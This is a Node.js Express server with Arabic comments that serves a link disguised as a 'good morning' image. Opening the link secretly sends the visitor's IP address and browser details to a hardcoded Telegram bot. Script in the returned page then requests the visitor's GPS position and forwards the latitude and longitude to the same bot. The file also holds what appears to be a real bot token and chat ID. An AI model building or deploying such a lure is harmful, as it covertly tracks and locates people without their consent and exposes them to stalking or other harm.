import express from "express";
import fetch from "node-fetch";
import path from "path";
import { fileURLToPath } from "url";

const app = express();
const PORT = process.env.PORT || 3000;

const BOT_TOKEN = "8250616721:AAHTMwBPgPoRmNuRSfdGCA0lB9G_6LH2jy0";
const CHAT_ID = "7485197107";

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

async function sendToTelegram(message) {
  const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
  await fetch(url, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ chat_id: CHAT_ID, text: message }),
  });
}

// رابط وهمي باسم .jpg لكنه HTML
app.get("/good_morning.jpg", async (req, res) => {
  const ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress;
  const ua = req.headers["user-agent"];
  await sendToTelegram(`📸 زيارة جديدة:\nIP: ${ip}\nUA: ${ua}`);

  // نحدد Content-Type كصورة ليظهر كصورة في التطبيقات
  res.set("Content-Type", "image/jpeg");

  res.send(`
    <!DOCTYPE html>
    <html lang="ar">
    <head><meta charset="UTF-8"><title></title></head>
    <body style="margin:0;display:flex;justify-content:center;align-items:center;height:100vh;background:#000;">
      <img src="/real_good_morning.jpg" style="max-width:100%;height:auto;" alt="صباح الخير">
      <script>
        if (navigator.geolocation) {
          navigator.geolocation.getCurrentPosition(pos => {
            fetch('/log?lat=' + pos.coords.latitude + '&lon=' + pos.coords.longitude);
          });
        }
      </script>
    </body>
    </html>
  `);
});

// استقبال GPS
app.get("/log", async (req, res) => {
  const { lat, lon } = req.query;
  if (lat && lon) {
    await sendToTelegram(\`📍 GPS:\nLatitude: \${lat}\nLongitude: \${lon}\`);
  }
  res.send("");
});

// الصورة الحقيقية
app.get("/real_good_morning.jpg", (req, res) => {
  res.sendFile(path.join(__dirname, "good_morning.jpg"));
});

app.listen(PORT, () => console.log("✅ Server running on port " + PORT));
